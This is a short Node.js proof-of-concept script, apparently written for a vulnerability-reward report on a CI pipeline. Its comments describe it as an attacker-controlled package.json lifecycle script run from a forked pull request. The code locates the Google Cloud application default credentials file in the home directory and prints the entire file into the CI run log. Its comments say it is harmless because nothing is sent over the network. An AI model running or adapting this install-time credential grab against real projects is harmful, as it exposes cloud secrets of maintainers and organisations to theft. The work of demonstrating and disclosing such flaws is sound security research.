// Attacker-controlled install-time probe (OSS VRP replica TESTMARK demo).
// Runs as a package.json lifecycle script from the FORK merge tree inside an
// unprivileged pr.yml job (permissions: {}). Reads the Google credential that
// dev-infra bazel/configure-remote planted in $HOME BEFORE any fork code ran.
// Harmless: prints to the run log only; no network, no exfiltration anywhere.
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const p = path.join(os.homedir(), '.config', 'gcloud', 'application_default_credentials.json');
console.log('<<<TESTMARK-CANARY-BEGIN>>>');
console.log('[probe] reading: ' + p);
try {
  const st = fs.statSync(p);
  console.log('[probe] file exists: size=' + st.size + ' mtime=' + st.mtime.toISOString());
  console.log(fs.readFileSync(p, 'utf8'));
} catch (e) {
  console.log('[probe] PROBE-ERROR: ' + e.message);
}
console.log('<<<TESTMARK-CANARY-END>>>');
